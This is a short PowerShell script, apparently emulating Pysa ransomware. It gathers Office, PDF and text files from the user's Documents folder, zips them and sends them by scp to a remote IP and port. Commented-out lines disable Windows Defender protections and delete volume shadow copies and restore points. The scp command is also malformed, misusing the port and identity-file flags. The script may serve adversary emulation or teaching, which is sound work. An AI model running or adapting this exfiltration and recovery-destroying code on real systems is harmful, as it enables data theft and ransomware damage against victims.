# Create a new folder
New-Item -ItemType Directory -Path "$env:USERPROFILE\Documents\files" 

# Search the Documents folder for the specified file types and copy them to the new folder
Get-ChildItem -Path "$env:USERPROFILE\Documents" -Include *.docx, *.xlsx, *.pdf, *.txt -Recurse | Copy-Item -Destination "$env:USERPROFILE\Documents\files"

# Compress the folder using Powershell cmdlet
Compress-Archive -Path "$env:USERPROFILE\Documents\files\*" -DestinationPath "$env:USERPROFILE\Documents\files.zip"

# SCP the zipped file over to the specified IP and port
scp -p 2222 -i "$env:USERPROFILE\Documents\files.zip" 192.168.6.71:



#Disable Windows Defender and Controlled Folder Access
#Set-MpPreference -DisableRealtimeMonitoring $true
#Set-MpPreference -EnableControlledFolderAccess Disabled

#Windows Defender is a built in feature that protects users from malicious scripts or programs by blocking unauthorized access to files or applications. 

#Pysa could trigger Controlled Folder Access if it attempts to access a file or folder that is not authorized for access. 
#For example, if Pysa attempts to access an administrator-level folder or a folder in the system directory, then Defender Controlled Folder Access will trigger an alert and block the action.



#Delete Volume Shadow Copies and Restore Points
#Disable-ComputerRestore -Drive "C:\"
#Remove-VssBackupComponents -All -Verbose

